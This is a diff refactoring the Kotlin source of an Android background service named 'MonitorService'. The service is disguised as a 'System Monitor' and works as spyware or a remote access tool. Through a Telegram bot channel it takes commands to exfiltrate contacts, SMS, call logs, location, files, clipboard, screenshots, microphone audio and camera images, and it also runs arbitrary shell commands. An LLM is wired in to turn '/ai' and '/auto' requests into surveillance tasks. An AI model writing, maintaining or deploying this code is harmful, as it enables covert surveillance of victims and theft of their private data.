@@ -86,7 +86,7 @@ class MonitorService : Service() {
         initializeService()
     }
 
-    private fun initializeService(): Unit {
+    private fun initializeService() {
         try {
             loadConfig()
             acquireWakeLock()
@@ -103,7 +103,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun loadConfig(): Unit {
+    private fun loadConfig() {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
         val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
@@ -113,7 +113,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun checkAndRunTest(): Unit {
+    private fun checkAndRunTest() {
         if (testCompleted.getAndSet(true)) return
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         if (prefs.getBoolean(KEY_TEST_SENT, false)) return
@@ -130,7 +130,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun runTestSequence(): Unit {
+    private fun runTestSequence() {
         try {
             Log.d("MonitorService", "Running test sequence...")
             var results = ""
@@ -155,7 +155,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun acquireWakeLock(): Unit {
+    private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
             wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
@@ -163,7 +163,7 @@ class MonitorService : Service() {
         } catch (e: Exception) { Log.e("MonitorService", "Wake lock error", e) }
     }
 
-    private fun registerCommandReceiver(): Unit {
+    private fun registerCommandReceiver() {
         commandReceiver = CommandReceiver()
         val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -173,7 +173,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun startTelegramBot(): Unit {
+    private fun startTelegramBot() {
         thread("delete-wh") {
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
@@ -185,7 +185,7 @@ class MonitorService : Service() {
         pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
     }
 
-    private fun pollLoop(): Unit {
+    private fun pollLoop() {
         while (running) {
             try {
                 val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
@@ -211,7 +211,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun handleTelegramUpdate(update: com.google.gson.JsonObject): Unit {
+    private fun handleTelegramUpdate(update: com.google.gson.JsonObject) {
         val msg = update.get("message")?.asJsonObject ?: return
         val chatId = msg.get("chat").asJsonObject.get("id").asLong
         val userId = msg.get("from").asJsonObject.get("id").asLong
@@ -223,30 +223,65 @@ class MonitorService : Service() {
         }
 
         val trimmed = text.trim()
-        when {
-            trimmed == "/start" || trimmed == "/help" -> sendTelegramMessage(chatId, getHelp())
-            trimmed == "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
-            trimmed == "/contacts" -> sendTelegramTask(chatId, "contacts", emptyMap())
-            trimmed == "/sms" -> sendTelegramTask(chatId, "sms", emptyMap())
-            trimmed == "/calls" -> sendTelegramTask(chatId, "call_logs", emptyMap())
-            trimmed == "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
-            trimmed == "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
-            trimmed == "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
-            trimmed == "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
-            trimmed == "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
-            trimmed == "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
-            trimmed == "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 10))
-            trimmed == "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
-            trimmed.startsWith("/ai ") -> handleAiCommand(chatId, trimmed.substring(4).trim())
-            trimmed.startsWith("/auto ") -> handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
-            else -> {
-                if (trimmed.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to trimmed.substring(7).trim()))
-                else sendTelegramMessage(chatId, "Unknown. Use /help")
-            }
+        if (trimmed == "/start" || trimmed == "/help") {
+            sendTelegramMessage(chatId, getHelp())
+        } else if (trimmed == "/status") {
+            sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
+        } else if (trimmed == "/contacts") {
+            sendTelegramTask(chatId, "contacts", emptyMap())
+        } else if (trimmed == "/sms") {
+            sendTelegramTask(chatId, "sms", emptyMap())
+        } else if (trimmed == "/calls") {
+            sendTelegramTask(chatId, "call_logs", emptyMap())
+        } else if (trimmed == "/apps") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "list"
+            sendTelegramTask(chatId, "apps", m)
+        } else if (trimmed == "/location") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "get"
+            sendTelegramTask(chatId, "location", m)
+        } else if (trimmed == "/files") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "list"
+            m["path"] = "/sdcard"
+            sendTelegramTask(chatId, "files", m)
+        } else if (trimmed == "/wifi") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "scan"
+            sendTelegramTask(chatId, "wifi", m)
+        } else if (trimmed == "/clipboard") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "get"
+            sendTelegramTask(chatId, "clipboard", m)
+        } else if (trimmed == "/screenshot") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "capture"
+            sendTelegramTask(chatId, "screen", m)
+        } else if (trimmed == "/audio") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "start"
+            m["duration"] = 10
+            sendTelegramTask(chatId, "audio", m)
+        } else if (trimmed == "/camera") {
+            val m = mutableMapOf<String, Any>()
+            m["action"] = "capture"
+            m["camera"] = 0
+            sendTelegramTask(chatId, "camera", m)
+        } else if (trimmed.startsWith("/ai ")) {
+            handleAiCommand(chatId, trimmed.substring(4).trim())
+        } else if (trimmed.startsWith("/auto ")) {
+            handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
+        } else if (trimmed.startsWith("/shell ")) {
+            val m = mutableMapOf<String, Any>()
+            m["command"] = trimmed.substring(7).trim()
+            sendTelegramTask(chatId, "shell", m)
+        } else {
+            sendTelegramMessage(chatId, "Unknown. Use /help")
         }
     }
 
-    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>): Unit {
+    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
         val taskId = java.util.UUID.randomUUID().toString()
         val latch = CountDownLatch(1)
         val callback = TelegramCallback(chatId, latch)
@@ -280,7 +315,7 @@ class MonitorService : Service() {
     }
 
     inner class CommandReceiver : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent): Unit {
+        override fun onReceive(context: Context, intent: Intent) {
             val capability = intent.getStringExtra("capability") ?: return
             val argsJson = intent.getStringExtra("args") ?: "{}"
             val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
@@ -290,7 +325,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long): Unit {
+    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long) {
         var output: Any? = null
         var error: String? = null
         var status = "completed"
@@ -530,7 +565,7 @@ class MonitorService : Service() {
             val latch = CountDownLatch(1)
             var result: Map<String, Any>? = null
             val listener = object : LocationListener {
-                override fun onLocationChanged(location: Location): Unit {
+                override fun onLocationChanged(location: Location) {
                     val m = mutableMapOf<String, Any>()
                     m["lat"] = location.latitude
                     m["lon"] = location.longitude
@@ -540,9 +575,9 @@ class MonitorService : Service() {
                     result = m
                     latch.countDown()
                 }
-                override fun onProviderDisabled(provider: String): Unit { latch.countDown() }
-                override fun onProviderEnabled(provider: String): Unit {}
-                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?): Unit {}
+                override fun onProviderDisabled(provider: String) { latch.countDown() }
+                override fun onProviderEnabled(provider: String) {}
+                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
             }
 
             try {
@@ -609,7 +644,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun stopRecording(): Unit {
+    private fun stopRecording() {
         mediaRecorder?.let {
             try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
             mediaRecorder = null
@@ -657,7 +692,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0): Unit {
+    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
         val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
             putExtra("task_id", taskId)
             putExtra("result", result?.toString() ?: "")
@@ -683,7 +718,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun createNotificationChannel(): Unit {
+    private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                 .apply { description = "Background monitoring" }
@@ -706,11 +741,11 @@ class MonitorService : Service() {
             .build()
     }
 
-    private fun sendTelegramMessage(chatId: Long, text: String): Unit {
+    private fun sendTelegramMessage(chatId: Long, text: String) {
         thread("tg-$chatId") { sendTelegramInternal(chatId, text) }
     }
 
-    private fun sendTelegramInternal(chatId: Long, text: String): Unit {
+    private fun sendTelegramInternal(chatId: Long, text: String) {
         try {
             val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
             val params = mutableMapOf<String, Any>()
@@ -718,14 +753,14 @@ class MonitorService : Service() {
             params["text"] = if (text.length > 4000) text.take(4000) + "\n...[truncated]" else text
             params["parse_mode"] = "Markdown"
             val jsonBody = gson.toJson(params)
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.Companion.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
     }
 
-    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = ""): Unit {
+    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
         thread("tg-doc-$chatId") {
             try {
                 val file = File(getExternalFilesDir(null), filename)
@@ -736,7 +771,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
+                        RequestBody.create(MediaType.Companion.parse("text/plain"), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -746,7 +781,7 @@ class MonitorService : Service() {
         }
     }
 
-    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean): Unit {
+    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean) {
         if (content.length > 4000 || forceFile) {
             sendTelegramDocument(chatId, filename, content, caption)
         } else {
@@ -777,10 +812,8 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            when (lower) {
-                "hi", "hello", "hey", "test", "ping" -> {
-                    return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
-                }
+            if (lower == "hi" || lower == "hello" || lower == "hey" || lower == "test" || lower == "ping") {
+                return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
             }
 
             val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
@@ -806,7 +839,7 @@ Only respond with valid JSON, no extra text."""
             payload["stream"] = false
 
             val jsonBody = gson.toJson(payload)
-            val mediaType = MediaType.parse("application/json")
+            val mediaType = MediaType.Companion.parse("application/json")
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
@@ -893,7 +926,7 @@ Only respond with valid JSON, no extra text."""
         return results
     }
 
-    private fun handleAiCommand(chatId: Long, prompt: String): Unit {
+    private fun handleAiCommand(chatId: Long, prompt: String) {
         val taskId = java.util.UUID.randomUUID().toString()
         val latch = CountDownLatch(1)
         val callback = TelegramCallback(chatId, latch)
@@ -940,7 +973,7 @@ Only respond with valid JSON, no extra text."""
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = if (persistentMode) START_STICKY else START_NOT_STICKY
 
-    override fun onDestroy(): Unit {
+    override fun onDestroy() {
         running = false
         wakeLock?.release()
         pollThread?.interrupt()
